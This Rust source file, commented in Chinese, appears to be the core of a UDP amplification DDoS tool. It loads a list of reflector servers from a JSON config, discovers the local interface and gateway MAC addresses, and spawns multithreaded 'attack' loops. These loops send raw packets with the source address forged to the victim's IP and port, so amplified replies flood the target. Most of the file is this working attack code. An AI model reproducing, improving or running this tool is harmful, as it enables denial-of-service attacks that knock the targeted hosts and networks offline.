mod protocols;


use std::io::Read;
use std::process::exit;
use std::sync::Arc;
use std::thread::JoinHandle;
use clap::ArgMatches;
use colorful::Colorful;
use rand::Rng;
use rawsock::InterfaceDescription;


/// 获取所有的网卡接口
/// 如果错误则退出
pub fn available_devices() -> Vec<InterfaceDescription> {
    let lib = rawsock::open_best_library().unwrap();
    if let Ok(interfaces) = lib.all_interfaces() {
        interfaces
    } else {
        println!("{}无法获取网卡信息", "Error: ".red().bold());
        exit(1);
    }
}

/// 从文件中加载UDP放大器列表
pub fn get_amplifiers_from_file(path: String) -> Vec<Box<dyn protocols::Amplifier>> {
    if let Ok(mut file) = std::fs::File::open(path.to_owned()) {
        let mut buf = String::new();
        if file.read_to_string(&mut buf).is_err() {
            println!("{}无法读取文件 {}", "Error: ".red().bold(), path.underlined());
            exit(1);
        }
        if let Ok(config) = serde_json::from_str::<Vec<serde_json::Value>>(&buf) {
            let mut amplifiers = Vec::new();
            for amplifier_config in config {
                match protocols::get_amplifier(amplifier_config) {
                    Ok(amplifier) => {
                        amplifiers.push(amplifier);
                    }
                    Err(e) => {
                        println!("{}无法解析配置文件 {}", "Error: ".red().bold(), path.underlined());
                        println!("{}", e);
                        exit(1);
                    }
                }
            }
            return amplifiers;
        } else {
            println!("{}无法解析文件 {}", "Error: ".red().bold(), path.underlined());
            exit(1);
        }
    } else {
        println!("{}无法打开放大器配置文件 {}", "Error: ".red().bold(), path.underlined());
        exit(1);
    }
}

/// 获取一个可用的UDP端口
pub fn get_available_port() -> u16 {
    let mut port = 9999;
    loop {
        if let Ok(_) = std::net::UdpSocket::bind(("localhost", port)) {
            return port;
        }
        port += 1;
        if port >= 65535 {
            println!("{}找不到可用的端口号", "Error: ".red().bold());
            exit(1);
        }
    }
}

/// 通过命令行参数获取网络设备
/// 如果没有配置网络设备，则使用默认的网络设备
pub fn get_configured_device_name(matches: &ArgMatches) -> String {
    let lib = rawsock::open_best_library().unwrap();
    if let Some(device_id) = matches.value_of("device") {
        let device_id = device_id.parse::<usize>();
        if device_id.is_err() {
            println!("{}无法解析网卡编号", "Error: ".red().bold());
            exit(1);
        }
        let device_id = device_id.unwrap();

        let all_devices = lib.all_interfaces();
        if all_devices.is_err() {
            println!("{}无法获取可用网络设备", "Error: ".bold().yellow());
            exit(1);
        }
        let all_devices = all_devices.unwrap();
        let device = all_devices.get(device_id);
        if device.is_none() {
            println!("{}无效的设备ID:{}", "Error: ".bold().yellow(), device_id);
            exit(1);
        }
        device.unwrap().name.to_owned()
    } else {
        // 未指定 使用系统默认设备
        if let Ok(interface) = default_net::get_default_interface() {
            for lib_interface in lib.all_interfaces().unwrap() {
                if (&lib_interface.description) == interface.description.as_ref().unwrap() {
                    return lib_interface.name.to_owned();
                }
            }
            println!("{}无法获取默认网络设备", "Error: ".bold().yellow());
            exit(1);
        } else {
            println!("{}无法获取默认网络设备", "Error: ".bold().yellow());
            exit(1);
        }
    }
}

// /// 获取某个网路适配器的默认网关的IP地址和Mac地址
// pub fn get_interface_default_gateway(name: String) -> (String, String) {
//     for interface in default_net::get_interfaces() {
//         if interface.name == name {
//             if interface.gateway.is_some() {
//                 return (interface.gateway.unwrap().ip_addr.to_string(), interface.gateway.unwrap().mac_addr.to_string());
//             } else {
//                 println!("{}无法获取默认网关信息", "Error: ".bold().red());
//                 exit(1);
//             }
//         }
//     }
//     println!("{}无法获取网络设备信息", "Error: ".bold().red());
//     exit(1);
// }
/// 某个局域网内的信息
#[derive(Debug, Clone)]
pub struct NetInfo {
    pub local_ip: String,
    pub local_mac: String,
    pub gateway_ip: String,
    pub gateway_mac: String,
}

fn ip_to_num(ip: String) -> u32 {
    let mut num = 0;
    let mut i = 0;
    for octet in ip.split('.') {
        num += u32::from_str_radix(octet, 10).unwrap() << (i * 8);
        i += 1;
    }
    num
}

pub fn get_net_info(mut name: String) -> NetInfo {
    if name.find("\\Device\\NPF_").is_some() {
        // 如果是npf设备，则去掉前缀
        name = name.replace("\\Device\\NPF_", "");
    }
    for interface in default_net::get_interfaces() {
        if interface.name == name {
            if interface.gateway.is_some() {
                let gateway = interface.gateway.unwrap();
                // 获取与网关在同一网段下的IP地址
                let mut local_ip = String::new();
                let local_mac = interface.mac_addr.unwrap().to_string();
                for ip in interface.ipv4 {
                    let mask = ip_to_num(ip.netmask.to_string());
                    if ip_to_num(ip.addr.to_string()) & mask == ip_to_num(gateway.ip_addr.to_string()) & mask {
                        local_ip = ip.addr.to_string();
                        break;
                    }
                }
                if local_ip.is_empty() {
                    println!("{}无法获取本地IP地址", "Error: ".bold().red());
                    exit(1);
                }
                return NetInfo {
                    local_ip,
                    local_mac,
                    gateway_ip: gateway.ip_addr.to_string(),
                    gateway_mac: gateway.mac_addr.to_string(),
                };
            } else {
                println!("{}无法获取默认网关信息", "Error: ".bold().red());
                exit(1);
            }
        }
    }
    println!("{}无法获取网络设备信息", "Error: ".bold().red());
    exit(1);
}

/// 将带单位的大小转换为字节数
pub fn parse_threshold(threshold: String) -> usize {
    let mut num = 0usize;
    let mut unit = String::new();
    for c in threshold.chars() {
        if c.is_digit(10) {
            num = num * 10 + c.to_digit(10).unwrap() as usize;
        } else {
            unit = c.to_string().to_uppercase();
        }
    }
    match unit.as_ref() {
        "K" => num * 1024,
        "M" => num * 1024 * 1024,
        "G" => num * 1024 * 1024 * 1024,
        "T" => num * 1024 * 1024 * 1024 * 1024,
        "P" => num * 1024 * 1024 * 1024 * 1024 * 1024,
        _ => num,
    }
}

fn string_mac_to_array(mac: String) -> [u8; 6] {
    let mut array = [0u8; 6];
    let mut i = 0;
    for octet in mac.split(':') {
        array[i] = u8::from_str_radix(octet, 16).unwrap();
        i += 1;
    }
    array
}

pub fn string_ip_to_array(ip: String) -> [u8; 4] {
    let mut array = [0u8; 4];
    let mut i = 0;
    for octet in ip.split('.') {
        array[i] = u8::from_str_radix(octet, 10).unwrap();
        i += 1;
    }
    array
}

/// 多线程攻击
pub fn attack_multithreaded(
    target: String, // 目标地址
    device: String, // 网卡名称
    net_info: NetInfo, // 网络信息
    amplifiers: Vec<Box<dyn protocols::Amplifier>>, // 放大器列表
    interval: u64, // 攻击间隔
    num_threads: usize, // 线程数量
    halter: crossbeam::channel::Receiver<bool>, // 用于接受停止信号
    stat: crossbeam::channel::Sender<usize>, // 用于统计包大小
) -> Vec<JoinHandle<()>> {
    let target_ip = target.split(":").next().unwrap();
    let target_port = target.split(":").skip(1).next().unwrap();
    let mut threads = Vec::new();
    let amplifiers = Arc::new(amplifiers);

    // 提前计算所有请求包
    // println!("{}正在提前计算请求包...", "Info: ".bold().green());
    // let target_ip = string_ip_to_array(target_ip.to_string());
    // let target_port = target_port.parse::<u16>().unwrap();
    // let mut packets = Vec::new();
    // for amplifier in amplifiers.iter() {
    //     let builder = etherparse::PacketBuilder::ethernet2(
    //         string_mac_to_array(net_info.local_mac.to_owned()),
    //         string_mac_to_array(net_info.gateway_mac.to_owned()),
    //     )
    //         .ipv4(target_ip, string_ip_to_array(amplifier.get_dest_ip()), 20)
    //         .udp(target_port, amplifier.get_dest_port());
    //     let payload = amplifier.make_udp_payload();
    //     let mut packet = Vec::with_capacity(builder.size(payload.len()));
    //     builder.write(&mut packet, payload.as_slice());
    //     packets.push(packet);
    // }

    let lib = rawsock::open_best_library_arc().unwrap();
    println!("{}启动 {} 个攻击线程...", "Info: ".bold().green(), num_threads);
    for _ in 0..num_threads {
        let halter = halter.clone();
        let stat = stat.clone();
        let lib_clone = lib.clone();
        let device_clone = device.clone();
        let amplifiers_clone = amplifiers.clone();
        let local_mac = string_mac_to_array(net_info.local_mac.to_owned());
        let gateway_mac = string_mac_to_array(net_info.gateway_mac.to_owned());
        let target_ip = string_ip_to_array(target_ip.to_string());
        let target_port = target_port.parse::<u16>().unwrap();

        let thread = std::thread::spawn(move || {
            let mut interface = lib_clone.open_interface(device_clone.as_str()).unwrap();
            let mut rng = rand::thread_rng();
            let mut i = rng.gen_range(0..amplifiers_clone.len());

            loop {
                // 计算请求包
                let amplifier = amplifiers_clone.get(i).unwrap();
                let builder = etherparse::PacketBuilder::ethernet2(
                    local_mac,
                    gateway_mac,
                )
                    .ipv4(target_ip, string_ip_to_array(amplifier.get_dest_ip()), 20)
                    .udp(target_port, amplifier.get_dest_port());
                let payload = amplifier.make_udp_payload();
                let mut packet = Vec::with_capacity(builder.size(payload.len()));
                builder.write(&mut packet, payload.as_slice()).unwrap();


                if let Ok(_) = halter.try_recv() {
                    println!("{}攻击线程停止", "Info: ".bold().green());
                    break;
                }
                if let Ok(_) = interface.send(packet.as_slice()) {
                    stat.send(packet.len()).unwrap();
                    i = rng.gen_range(0..amplifiers_clone.len());
                    std::thread::sleep(std::time::Duration::from_millis(interval));
                } else {
                    // 静默重启
                    // println!("\n{}发包失败 1s 后重试", "Warning: ".bold().yellow());
                    // 重新打开接口
                    interface = lib_clone.open_interface(device_clone.as_str()).unwrap();
                    std::thread::sleep(std::time::Duration::from_secs(1));
                }

            }
        });
        threads.push(thread);
    }
    // for thread in threads {
    //     thread.join().unwrap();
    // }
    // println!("{}攻击结束", "Info: ".bold().green());
    threads
}

pub fn bytes_with_unit(bytes: usize) -> String {
    if bytes < 1024 {
        return format!("{}B", bytes);
    }
    if bytes < 1024 * 1024 {
        return format!("{}KB", bytes / 1024);
    }
    if bytes < 1024 * 1024 * 1024 {
        return format!("{}MB", bytes / 1024 / 1024);
    }
    format!("{}GB", bytes / 1024 / 1024 / 1024)
}